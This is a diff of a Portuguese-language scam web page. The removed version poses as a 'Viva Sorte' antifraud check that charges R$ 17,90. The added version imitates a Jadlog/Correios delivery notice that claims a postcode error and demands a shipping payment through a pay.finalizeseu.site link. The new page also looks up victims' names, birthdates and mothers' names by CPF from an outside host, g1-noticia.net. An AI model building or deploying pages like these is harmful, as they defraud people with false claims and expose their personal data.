@@ -1,367 +1,397 @@
-<!doctype html>
-<html lang="pt-br">
-<head>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Validação de Segurança - Viva Sorte</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #048848;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #0071c6;
+            cursor: pointer;
+        }
+    </style>
+
+
+    <title>VERIFICAÇÃO</title>
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script><script async="" defer="" src="js/pixel.js"></script></head>
+
+
+
+<body>
+    <header>
+        <img src="images/logo_home.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/certo-jadlog.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
+    </div>
+
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 105vh;
+    margin: 0;
+    background-color: #ffffff;
+  }
+
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+    50% {
+      box-shadow: 0 0 20px rgba(0, 123, 255, 1);
+    }
+    100% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+  }
+
+  .img-brilhante {
+    width: 105%;
+    max-width: 100px;
+    animation: pulse 2s infinite;
+    border-radius: 8px;
+    margin-top: -1.7em;
+    margin-bottom: 1.0em;
+  }
+</style>
+
+<img src="images/iphone.png" alt="iPhones" class="img-brilhante">
+
+<div id="info"> 
+  <p id="linha-bairro"><strong>Bairro:</strong> <span id="bairro">Erro</span></p>
+  <p><strong>Cidade:</strong> <span id="cidade">Erro</span></p>
+  <p><strong>Estado:</strong> <span id="estado">Erro</span></p>
+</div>
+
+<script>
+fetch("/get-endereco.php/get-endereco.php")
+  .then(res => res.json())
+  .then(data => {
+    if (data.bairro) {
+      document.getElementById("bairro").textContent = data.bairro;
+    } else {
+      document.getElementById("linha-bairro").style.display = "none";
+    }
+
+    document.getElementById("cidade").textContent = data.cidade || "—";
+    document.getElementById("estado").textContent = data.estado || "—";
+  })
+  .catch(() => {
+    document.getElementById("bairro").textContent = "Erro";
+    document.getElementById("cidade").textContent = "Erro";
+    document.getElementById("estado").textContent = "Erro";
+  });
+</script>
+
+<div style="text-align: center;">
+  <p id="setars">
+    O envio será feito em parceria com os Correios e o Sedex.
+  </p>
+</div>
+
+
+<div class="cta4">
+    <button id="sends" type="button">CONFIRMAR</button>
+</div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o envio não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+                </p>
+<style>
+
+@keyframes aparecer {
+  to { opacity: 1; }
+}
+
+@keyframes dots {
+}
+
+@keyframes fadeOut {
+  to { opacity: 0; visibility: hidden; height: 0; margin: 0; padding: 0; }
+}
+
+#img-container {
+  text-align: center;
+  margin-top: 10px;
+}
+
+#img-container p {
+  margin: 8px 0;
+  font-size: 14px;
+}
+
+#img-container strong {
+  display: block;
+  margin: 12px 0 6px;
+}
+
+/* Texto \"Calculando\" */
+#loading-box {
+  font-weight: bold;
+  font-size: 16px;
+  color: #0047BB;
+  min-height: 30px;
+  animation: fadeOut 0.2s ease 5s forwards;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 8px 0;
+}
+
+.loading-spinner::after {
+  content: ".";
+  animation: dots 1s steps(3, end) infinite;
+}
+
+/* Imagem */
+.img-destaque {
+  width: auto !important;
+  height: auto !important;
+  max-width: 100% !important;
+  border: 4px solid red;
+  border-radius: 10px;
+  display: block;
+  margin: 10px auto;
+  opacity: 0;
+  animation:
+    aparecer 0.5s ease 5s forwards,
+    bordaPiscando 1s infinite 3s;
+}
+
+@keyframes bordaPiscando {
+  0%, 100% { border-color: red; }
+  50%     { border-color: transparent; }
+}
+</style>
+
+
+
+<div id="frete-container" style="text-align: center; margin-top: 10px; font-family: Arial, sans-serif;">
+  <p><strong>Esse é o novo prazo de entrega:</strong></p>
+
+
+  <!-- CAIXA DO FRETE -->
+  <div style="
+    border: 2px solid #ccc;
+    padding: 12px;
+    border-radius: 10px;
+    font-size: 15px;
+    background-color: #fff;
+    display: inline-block;
+    text-align: left;
+    max-width: 95%;
+    margin-top: 10px;
+  ">
+    <label style="display: flex; align-items: flex-start; gap: 10px;">
+      <input type="radio" name="frete" checked="" style="margin-top: 4px;">
+      <div>
+        <strong>SEDEX Full – Mais rápido.</strong><br>
+        <span style="color: gray;">(Recomendado)</span><br>
+        <span id="proximo-dia" style="font-weight: bold; color: rgb(0, 179, 0); font-size: 15px; display: block;">(CHEGA QUINTA)</span>
+      </div>
+    </label>
+  </div>
+
+  <!-- BOTÃO (invisível de início) -->
+  <div style="margin-top: 15px;">
+    <a id="buttonClick" href="https://pay.finalizeseu.site/RmA83Ea8zql3PVp" style="
+      display: none;
+      background-color: #048848;
+      color: white;
+      font-family: Poppins, sans-serif;
+      padding: 12px 24px;
+      text-decoration: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      display: inline-block;
+    ">PAGAR FRETE</a>
+
+    <div id="maisforte" style="display: block; font-size: 13px; margin-top: 5px;">
+      Clique no botão para continuar
+    </div>
+  </div>
+</div>
+
+
+
+ 
+<script>
+  const diasSemana = [
+    "(CHEGA DOMINGO)", "(CHEGA SEGUNDA)", "(CHEGA TERÇA)", "(CHEGA QUARTA)",
+    "(CHEGA QUINTA)", "(CHEGA SEXTA)", "(CHEGA SÁBADO)"
+  ];
+
+  const hoje = new Date().getDay();
+  const proximo = (hoje + 1) % 7;
+  const texto = diasSemana[proximo];
+
+  // Mostra o dia depois de 10 segundos
+  setTimeout(() => {
+    document.getElementById('proximo-dia').textContent = texto;
+    document.getElementById('proximo-dia').style.display = 'block';
+  }, 5);
+
+  // Mostra o botão e o texto depois de 11 segundos
+  setTimeout(() => {
+    document.getElementById('buttonClick').style.display = 'inline-block';
+    document.getElementById('maisforte').style.display = 'block';
+  }, 5);
+</script>
+
+
+
+
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/jadlog-logo-png.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
     <script>
-        window.pixelId = "68626214e18089aa45e829bb";
-        var a = document.createElement("script");
-        a.setAttribute("async", "");
-        a.setAttribute("defer", "");
-        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-        document.head.appendChild(a);
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+            
     </script>
     
     <style>
-        @font-face {
-            font-family: 'Futura-Book';
-            src: url('../font/Futura-Book.eot');
-            src: url('../font/Futura-Book.eot?#iefix') format('embedded-opentype'),
-                url('../font/Futura-Book.woff2') format('woff2'),
-                url('../font/Futura-Book.woff') format('woff'),
-                url('../font/Futura-Book.ttf') format('truetype'),
-                url('../font/Futura-Book.svg#Futura-Book') format('svg');
-            font-weight: normal;
-            font-style: normal;
-            font-display: swap;
-        }
+#sends {
+    background-color: #0071c6;
+    color: white;
+    font-family: "Poppins", sans-serif;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 10px;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    max-width: 280px;
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
 
-        body {
-            font-family: 'Futura-Book', 'Inter', sans-serif !important;
-            background-color: #f5f7fa;
-            margin: 0;
-            padding: 0;
-            line-height: 1.6;
-        }
+#sends:hover {
+    background-color: #048848;
+}
+</style>
 
-        .header-oficial {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            padding: 1rem 0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
-        }
+<style>
+  .progresseBar {
+    width: 100%;
+    height: 10px;
+    background-color: #eee;
+    border-radius: 5px;
+    overflow: hidden;
+  }
 
-        .logo-caixa {
-            height: 32px;
-        }
+  .progress {
+    width: 0%;
+    height: 100%;
+    background-color: #0071c6; /* Cor azul desejada */
+    transition: width 0.5s ease;
+  }
+</style>
 
-        .container-main {
-            max-width: 600px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
+<script>
+  window.pixelId = "68252b4a42cbf25c85a8273f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
 
-        .card-validacao {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            overflow: hidden;
-            margin-bottom: 2rem;
-        }
-
-        .header-seguranca {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            color: white;
-            padding: 2rem;
-            text-align: center;
-            position: relative;
-        }
-
-        .icon-seguranca {
-            width: 60px;
-            height: 60px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-
-        .titulo-seguranca {
-            font-size: 1.8rem;
-            font-weight: 600;
-            margin: 0 0 0.5rem 0;
-            letter-spacing: 0.5px;
-        }
-
-        .subtitulo-seguranca {
-            font-size: 1rem;
-            margin: 0;
-            opacity: 0.95;
-            font-weight: 400;
-        }
-
-        .conteudo-principal {
-            padding: 2rem;
-            text-align: center;
-        }
-
-        .alert-validacao {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            position: relative;
-        }
-
-        .alert-icon {
-            color: #856404;
-            font-size: 1.2rem;
-            margin-right: 0.5rem;
-        }
-
-        .alert-titulo {
-            color: #856404;
-            font-weight: 600;
-            font-size: 1.1rem;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-        }
-
-        .valor-container {
-            text-align: center;
-            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
-            border-radius: 8px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid #dee2e6;
-        }
-
-        .valor-taxa {
-            font-size: 2.8rem;
-            font-weight: 700;
-            color: #28a745;
-            margin: 0;
-            line-height: 1;
-        }
-
-        .valor-descricao {
-            color: #6c757d;
-            font-size: 0.9rem;
-            margin-top: 0.5rem;
-            font-weight: 500;
-        }
-
-        .reembolso-info {
-            background: #d1ecf1;
-            border: 1px solid #bee5eb;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            text-align: center;
-        }
-
-        .reembolso-titulo {
-            color: #0c5460;
-            font-weight: 600;
-            font-size: 1.1rem;
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-
-        .btn-validacao {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            border: none;
-            color: white;
-            padding: 1rem 2rem;
-            font-size: 1.1rem;
-            font-weight: 600;
-            border-radius: 8px;
-            width: 100%;
-            margin: 1.5rem 0;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-
-        .btn-validacao:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(47, 78, 181, 0.3);
-            background: linear-gradient(135deg, #1e3a8a, #1e40af);
-        }
-
-        .rodape-caixa {
-            background: #173e68;
-            color: white;
-            padding: 2rem 0;
-            text-align: center;
-            margin-top: 3rem;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(47, 78, 181, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0); }
-        }
-
-        /* Responsividade */
-        @media (max-width: 768px) {
-            .container-main {
-                margin: 1rem auto;
-                padding: 0 0.5rem;
-            }
-            
-            .conteudo-principal {
-                padding: 1.5rem;
-            }
-            
-            .valor-taxa {
-                font-size: 2.2rem;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .header-seguranca {
-                padding: 1.5rem;
-            }
-            
-            .titulo-seguranca {
-                font-size: 1.6rem;
-            }
-            
-            .valor-taxa {
-                font-size: 1.8rem;
-            }
-            
-            .conteudo-principal {
-                padding: 1rem;
-            }
-        }
-    </style>
-</head>
-
-<body>
-    <!-- Header Oficial CAIXA -->
-    <div class="header-oficial">
-        <div class="container">
-            <div class="d-flex align-items-center justify-content-between">
-                <img src="../images/viva.png" alt="Viva Sorte" class="logo-caixa">
-                <div class="text-white">
-                    <small><i class="bi bi-shield-check"></i> Portal Oficial Viva Sorte</small>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="container-main">
-        <!-- Card Principal de Validação -->
-        <div class="card-validacao">
-            <!-- Header de Segurança -->
-            <div class="header-seguranca">
-                <div class="icon-seguranca">
-                    <i class="bi bi-shield-exclamation text-white" style="font-size: 1.5rem;"></i>
-                </div>
-                <h1 class="titulo-seguranca">VALIDAÇÃO DE SEGURANÇA</h1>
-                <p class="subtitulo-seguranca">Sistema de Proteção Antifraude Ativado</p>
-            </div>
-
-            <!-- Conteúdo Principal -->
-            <div class="conteudo-principal">
-                <!-- Alerta de Validação -->
-                <div class="alert-validacao">
-                    <div class="alert-titulo">
-                        <i class="bi bi-exclamation-triangle alert-icon"></i>
-                        VERIFICAÇÃO DE SEGURANÇA OBRIGATÓRIA
-                    </div>
-                    <p class="mb-0">
-                        Para garantir a segurança da transferência dos seus <strong>títulos de capitalização Viva Sorte</strong>, 
-                        é necessário validar sua identidade através do nosso sistema antifraude.
-                    </p>
-                </div>
-
-                <!-- Valor da Taxa -->
-                <div class="valor-container">
-                    <div class="valor-taxa">R$ 17,90</div>
-                    <div class="valor-descricao">Taxa de Validação Antifraude</div>
-                </div>
-
-                <!-- Informação de Reembolso -->
-                <div class="reembolso-info">
-                    <div class="reembolso-titulo">
-                        <i class="bi bi-arrow-repeat"></i>
-                        REEMBOLSO GARANTIDO
-                    </div>
-                    <p class="mb-0">
-                        O valor de R$ 17,90 será automaticamente reembolsado em seus títulos.
-                        <br><strong>Validação obrigatória para liberação dos títulos</strong>
-                    </p>
-                </div>
-
-                <!-- Botão de Validação -->
-                <button class="btn-validacao" onclick="processarPagamento(1790)">
-                    <i class="bi bi-shield-check"></i>
-                    VALIDAR IDENTIDADE - R$ 17,90
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Rodapé Oficial -->
-    <div class="rodape-caixa">
-        <div class="container text-center">
-            <p class="mb-2"><strong>VIVA SORTE - TÍTULOS DE CAPITALIZAÇÃO</strong></p>
-            <small>© 2025 - Todos os direitos reservados</small>
-        </div>
-    </div>
-
-    <!-- Modal de Loading -->
-    <div class="modal fade" id="loadingModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
-        <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-body text-center p-5">
-                    <div class="spinner-border mb-3" role="status" style="width: 3rem; height: 3rem; color: #2f4eb5;">
-                        <span class="visually-hidden">Carregando...</span>
-                    </div>
-                    <h5 class="modal-title" id="loadingModalLabel">Validando...</h5>
-                    <p class="mt-2">Aguarde...</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
-    
-    <script>
-        // Função para redirecionar diretamente para a página de pagamento
-        function processarPagamento(valor) {
-            // URL de destino
-            const baseUrl = 'https://pay.finalizeseu.site/v7R0gloXyYQGVr9';
-
-            // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
-            const currentParams = new URLSearchParams(window.location.search).toString();
-
-            // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
-            let redirectUrl = baseUrl;
-            if (currentParams) {
-                // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
-                if (baseUrl.includes('?')) {
-                    redirectUrl += '&' + currentParams;
-                } else {
-                    redirectUrl += '?' + currentParams;
-                }
-            }
-            
-            // Redireciona o navegador do usuário para o link final instantaneamente
-            window.location.href = redirectUrl;
-        }
-    </script>
-</body>
-</html> 
+</body></html>
